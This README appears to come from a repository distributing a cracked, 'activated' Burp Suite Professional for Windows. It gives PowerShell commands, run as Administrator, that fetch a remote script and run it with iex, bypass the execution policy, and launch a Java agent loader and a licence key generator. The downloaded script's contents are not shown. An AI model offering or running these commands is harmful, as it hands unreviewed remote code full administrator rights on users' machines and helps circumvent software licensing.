# Activated BurpSuite Professional for Windows 10/11

## Quick Install (One-Liner)

Open **PowerShell as Administrator** and run:

```powershell
irm https://raw.githubusercontent.com/ZenVim/BurpSuitePro/refs/heads/main/BurpSuitePro-Latest/activated.burp | iex
```

Or if the above is blocked:
```powershell
iex (irm https://raw.githubusercontent.com/ZenVim/BurpSuitePro/refs/heads/main/BurpSuitePro-Latest/activated.burp)
```

This single command will automatically:
- Download the latest repository files
- Install JDK-21 and JRE-8
- Download Burp Suite Professional
- Set up launcher scripts and shortcuts
- Launch the activation process

## Manual Installation (Alternative)

If you prefer manual setup:

1. Download and extract the repository to `C:\BurpSuitePro`
2. Open PowerShell as Administrator and run:

```powershell
cd C:\BurpSuitePro\BurpSuitePro-Latest
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope process
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\Install.ps1
```

### What the script does:
- Downloads and installs JDK-21
- Downloads and installs JRE-8
- Downloads the latest Burp Suite Professional version
- Downloads the Java agent loader
- Sets up launcher scripts and shortcuts
- Launches the license key generator and Burp Suite

## References
- https://github.com/xiv3r/Burpsuite-Professional
